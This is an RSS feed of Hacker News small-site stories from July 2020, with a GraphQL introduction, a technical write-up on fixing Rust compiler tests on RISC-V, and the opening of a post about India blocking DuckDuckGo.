<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 04 Jul 2020 12:19:43 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 04 Jul 2020 12:19:43 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Show HN: Introduction to GraphQL]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23711333">thread link</a>) | @oczek
<br/>
July 2, 2020 | https://blog.graphqleditor.com/introduction-to-graphql/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/introduction-to-graphql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>
<li><em>GraphQL Mutations</em> - mutations are used to write or post values.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/00d43/graphql_query_response.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="GraphQL Query &amp; Response" title="GraphQL Query &amp; Response" src="https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/fcda8/graphql_query_response.png" srcset="https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/12f09/graphql_query_response.png 148w,
https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/e4a3f/graphql_query_response.png 295w,
https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/fcda8/graphql_query_response.png 590w,
https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/efc66/graphql_query_response.png 885w,
https://blog.graphqleditor.com/static/fdd547ba79c689cf129b63fea7f8192c/00d43/graphql_query_response.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/6f278/graphql_resolvers.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Basic GraphQL resolver function" title="Basic GraphQL resolver function" src="https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/fcda8/graphql_resolvers.png" srcset="https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/12f09/graphql_resolvers.png 148w,
https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/e4a3f/graphql_resolvers.png 295w,
https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/fcda8/graphql_resolvers.png 590w,
https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/efc66/graphql_resolvers.png 885w,
https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/c83ae/graphql_resolvers.png 1180w,
https://blog.graphqleditor.com/static/4928db79f81281efbda8c410cf88a0cf/6f278/graphql_resolvers.png 1488w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/00d43/graphql_vs_rest.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="GraphQL vs REST the main difference" title="GraphQL vs REST the main difference" src="https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/fcda8/graphql_vs_rest.png" srcset="https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/12f09/graphql_vs_rest.png 148w,
https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/e4a3f/graphql_vs_rest.png 295w,
https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/fcda8/graphql_vs_rest.png 590w,
https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/efc66/graphql_vs_rest.png 885w,
https://blog.graphqleditor.com/static/e5c684bc3f2a7b5729d2b9b4ecb36514/00d43/graphql_vs_rest.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h2>Learn GraphQL</h2>
<p>As you can see GraphQL is a very interesting concept. In the past couple of years, it gained a lot of traction and became a skill much appreciated and often required in job offers. If you are interested in deepening your knowledge of GraphQL there are plenty of neat resources you can learn from. </p>
<h5>Knowlege base</h5>
<ol>
<li><a href="https://graphql.org/learn/">GrapQL Official Documentation</a> is the best place to start your GraphQL learning.</li>
<li><a href="https://graphqlweekly.com/">GraphQL Weekly</a> is a newsletter with GraphQL tutorials, news, and everything related to GraphQL.</li>
<li><a href="https://www.howtographql.com/">How to GraphQL</a> is a website that will explain to you in detail what is GraphQL and
guide your steps from GraphQL newbie to releasing your production GraphQL project.</li>
</ol>
<p><a href="https://graphqleditor.com/"><img src="https://blog.graphqleditor.com/cd11e751a68e1e57ef406525c71032b1/graphql_docs.gif" alt="static GraphQL docs generated by GraphQL Editor"></a></p>
<h3>GraphQL Tools</h3>
<ol>
<li><a href="https://graphcms.com/">GraphCMS</a> a tool that allows you to build a hosted GraphQL backend for your web project along with tools to manage its content.</li>
<li>
<p><a href="https://graphqleditor.com/">GraphQL Editor</a> is a graphic playground for GraphQL allowing you to build &amp; manage your graphql schema faster giving you a set of GraphQL tools to:</p>
<ul>
<li>bulletproof GraphQL IDE (error handling, type validation),</li>
<li>generate static GraphQL docs,</li>
<li>preview GraphQL queries with a Live JAMStack Engine &amp; Mock Backend.</li>
</ul>
</li>
<li><a href="https://launchpad.graphql.com/new">Dgraph</a> is a native GraphQL database to help you build apps faster.</li>
<li><a href="https://hasura.io/">Hasura</a> makes your PostgreSQL database instantly available over GraphQL API.</li>
<li><a href="https://www.apollographql.com/">Apollo</a> a platform that allows you to combine databases, different APIs, and microservices into a single data source that you can query using GraphQL.</li>
</ol></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/introduction-to-graphql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23711333</guid>
            <pubDate>Thu, 02 Jul 2020 09:03:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing Rust's test suite on RISC-V]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710907">thread link</a>) | @lukastyrychtr
<br/>
July 2, 2020 | https://www.codethink.co.uk/articles/2020/fixing-rusts-test-suite-on-risc-v/ | <a href="https://web.archive.org/web/*/https://www.codethink.co.uk/articles/2020/fixing-rusts-test-suite-on-risc-v/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <div>
          <p><img src="https://www.codethink.co.uk/theme/images/softwarebug.jpg" alt="Binary data">
          </p>
          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>
<div><pre><span></span><span>/// Checks that all of the arms in an or-pattern have exactly the</span>
<span>/// same set of bindings, with the same binding modes for each.</span>
<span>fn</span> <span>check_consistent_bindings</span><span>(</span><span>&amp;</span><span>mut</span><span> </span><span>self</span><span>,</span><span> </span><span>pats</span>: <span>&amp;</span><span>[</span><span>P</span><span>&lt;</span><span>Pat</span><span>&gt;</span><span>])</span><span> </span>-&gt; <span>Vec</span><span>&lt;</span><span>BindingMap</span><span>&gt;</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>missing_vars</span><span> </span><span>=</span><span> </span><span>FxHashMap</span>::<span>default</span><span>();</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>inconsistent_vars</span><span> </span><span>=</span><span> </span><span>FxHashMap</span>::<span>default</span><span>();</span><span></span>

<span>    </span><span>// 1) Compute the binding maps of all arms.</span>
<span>[...]</span><span></span>

<span>    </span><span>// 2) Record any missing bindings or binding mode inconsistencies.</span>
<span>[...]</span><span></span>

<span>    </span><span>// 3) Report all missing variables we found.</span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>missing_vars</span><span> </span><span>=</span><span> </span><span>missing_vars</span><span>.</span><span>iter_mut</span><span>().</span><span>collect</span>::<span>&lt;</span><span>Vec</span><span>&lt;</span><span>_</span><span>&gt;&gt;</span><span>();</span><span></span>
<span>    </span><span>missing_vars</span><span>.</span><span>sort</span><span>();</span><span></span>

<span>    </span><span>for</span><span> </span><span>(</span><span>name</span><span>,</span><span> </span><span>mut</span><span> </span><span>v</span><span>)</span><span> </span><span>in</span><span> </span><span>missing_vars</span><span> </span><span>{</span><span></span>
<span>        </span><span>if</span><span> </span><span>inconsistent_vars</span><span>.</span><span>contains_key</span><span>(</span><span>name</span><span>)</span><span> </span><span>{</span><span></span>
<span>            </span><span>v</span><span>.</span><span>could_be_path</span><span> </span><span>=</span><span> </span><span>false</span><span>;</span><span></span>
<span>        </span><span>}</span><span></span>
<span>        </span><span>self</span><span>.</span><span>r</span><span>.</span><span>report_error</span><span>(</span><span></span>
<span>            </span><span>*</span><span>v</span><span>.</span><span>origin</span><span>.</span><span>iter</span><span>().</span><span>next</span><span>().</span><span>unwrap</span><span>(),</span><span></span>
<span>            </span><span>ResolutionError</span>::<span>VariableNotBoundInPattern</span><span>(</span><span>v</span><span>),</span><span></span>
<span>        </span><span>);</span><span></span>
<span>    </span><span>}</span><span></span>

<span>[...]</span><span></span>
<span>}</span><span></span>
</pre></div>


<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>
<div><pre><span></span><span>// The `&amp;'static str`s in this type actually point into the arena.</span>
<span>#[derive(Default)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Interner</span><span> </span><span>{</span><span></span>
<span>    </span><span>arena</span>: <span>DroplessArena</span><span>,</span><span></span>
<span>    </span><span>names</span>: <span>FxHashMap</span><span>&lt;&amp;</span><span>'static</span><span> </span><span>str</span><span>,</span><span> </span><span>Symbol</span><span>&gt;</span><span>,</span><span></span>
<span>    </span><span>strings</span>: <span>Vec</span><span>&lt;&amp;</span><span>'static</span><span> </span><span>str</span><span>&gt;</span><span>,</span><span></span>
<span>}</span><span></span>

<span>impl</span><span> </span><span>Interner</span><span> </span><span>{</span><span></span>
<span>    </span><span>#[inline]</span><span></span>
<span>    </span><span>pub</span><span> </span><span>fn</span> <span>intern</span><span>(</span><span>&amp;</span><span>mut</span><span> </span><span>self</span><span>,</span><span> </span><span>string</span>: <span>&amp;</span><span>str</span><span>)</span><span> </span>-&gt; <span>Symbol</span><span> </span><span>{</span><span></span>
<span>        </span><span>if</span><span> </span><span>let</span><span> </span><span>Some</span><span>(</span><span>&amp;</span><span>name</span><span>)</span><span> </span><span>=</span><span> </span><span>self</span><span>.</span><span>names</span><span>.</span><span>get</span><span>(</span><span>string</span><span>)</span><span> </span><span>{</span><span></span>
<span>            </span><span>return</span><span> </span><span>name</span><span>;</span><span></span>
<span>        </span><span>}</span><span></span>

<span>        </span><span>let</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>new</span><span>(</span><span>self</span><span>.</span><span>strings</span><span>.</span><span>len</span><span>()</span><span> </span><span>as</span><span> </span><span>u32</span><span>);</span><span></span>

<span>        </span><span>// `from_utf8_unchecked` is safe since we just allocated a `&amp;str` which is known to be</span>
<span>        </span><span>// UTF-8.</span>
<span>        </span><span>let</span><span> </span><span>string</span>: <span>&amp;</span><span>str</span> <span>=</span><span></span>
<span>            </span><span>unsafe</span><span> </span><span>{</span><span> </span><span>str</span>::<span>from_utf8_unchecked</span><span>(</span><span>self</span><span>.</span><span>arena</span><span>.</span><span>alloc_slice</span><span>(</span><span>string</span><span>.</span><span>as_bytes</span><span>()))</span><span> </span><span>};</span><span></span>
<span>        </span><span>// It is safe to extend the arena allocation to `'static` because we only access</span>
<span>        </span><span>// these while the arena is still alive.</span>
<span>        </span><span>let</span><span> </span><span>string</span>: <span>&amp;</span><span>'static</span><span> </span><span>str</span><span> </span><span>=</span><span> </span><span>unsafe</span><span> </span><span>{</span><span> </span><span>&amp;*</span><span>(</span><span>string</span><span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>str</span><span>)</span><span> </span><span>};</span><span></span>
<span>        </span><span>self</span><span>.</span><span>strings</span><span>.</span><span>push</span><span>(</span><span>string</span><span>);</span><span></span>
<span>        </span><span>self</span><span>.</span><span>names</span><span>.</span><span>insert</span><span>(</span><span>string</span><span>,</span><span> </span><span>name</span><span>);</span><span></span>
<span>        </span><span>name</span><span></span>
<span>    </span><span>}</span><span></span>
<span>}</span><span></span>

<span>impl</span><span> </span><span>Symbol</span><span> </span><span>{</span><span></span>
<span>    </span><span>const</span><span> </span><span>fn</span> <span>new</span><span>(</span><span>n</span>: <span>u32</span><span>)</span><span> </span>-&gt; <span>Self</span><span> </span><span>{</span><span></span>
<span>        </span><span>Symbol</span><span>(</span><span>SymbolIndex</span>::<span>from_u32</span><span>(</span><span>n</span><span>))</span><span></span>
<span>    </span><span>}</span><span></span>

<span>    </span><span>/// Maps a string to its interned representation.</span>
<span>    </span><span>pub</span><span> </span><span>fn</span> <span>intern</span><span>(</span><span>string</span>: <span>&amp;</span><span>str</span><span>)</span><span> </span>-&gt; <span>Self</span><span> </span><span>{</span><span></span>
<span>        </span><span>with_interner</span><span>(</span><span>|</span><span>interner</span><span>|</span><span> </span><span>interner</span><span>.</span><span>intern</span><span>(</span><span>string</span><span>))</span><span></span>
<span>    </span><span>}</span><span></span>

<span>    </span><span>/// Access the symbol's chars. This is a slowish operation because it</span>
<span>    </span><span>/// requires locking the symbol interner.</span>
<span>    </span><span>pub</span><span> </span><span>fn</span> <span>with</span><span>&lt;</span><span>F</span>: <span>FnOnce</span><span>(</span><span>&amp;</span><span>str</span><span>)</span><span> </span>-&gt; <span>R</span><span>,</span><span> </span><span>R</span><span>&gt;</span><span>(</span><span>self</span><span>,</span><span> </span><span>f</span>: <span>F</span><span>)</span><span> </span>-&gt; <span>R</span><span> </span><span>{</span><span></span>
<span>        </span><span>with_interner</span><span>(</span><span>|</span><span>interner</span><span>|</span><span> </span><span>f</span><span>(</span><span>interner</span><span>.</span><span>get</span><span>(</span><span>self</span><span>)))</span><span></span>
<span>    </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.codethink.co.uk/articles/2020/fixing-rusts-test-suite-on-risc-v/">https://www.codethink.co.uk/articles/2020/fixing-rusts-test-suite-on-risc-v/</a></em></p>]]>
            </description>
            <link>https://www.codethink.co.uk/articles/2020/fixing-rusts-test-suite-on-risc-v/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710907</guid>
            <pubDate>Thu, 02 Jul 2020 07:46:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indian Gov Bans DuckDuckGo]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710613">thread link</a>) | @chewdatgenie
<br/>
July 1, 2020 | https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/ | <a href="https://web.archive.org/web/*/https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1094">

		<!-- .entry-header -->

		
		<div>

			<div>
				
<figure><img data-attachment-id="1095" data-permalink="https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/duckduckgo/" data-orig-file="https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?fit=1050%2C741&amp;ssl=1" data-orig-size="1050,741" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="duckduckgo" data-image-description="" data-medium-file="https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?fit=300%2C212&amp;ssl=1" data-large-file="https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?fit=756%2C534&amp;ssl=1" src="https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?fit=756%2C534&amp;ssl=1" alt="" srcset="https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?w=1050&amp;ssl=1 1050w, https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?resize=300%2C212&amp;ssl=1 300w, https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?resize=1024%2C723&amp;ssl=1 1024w, https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?resize=768%2C542&amp;ssl=1 768w, https://i0.wp.com/crackerscreed.org/wp-content/uploads/2020/07/duckduckgo.jpg?resize=200%2C141&amp;ssl=1 200w" sizes="(max-width: 756px) 100vw, 756px"></figure>



<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
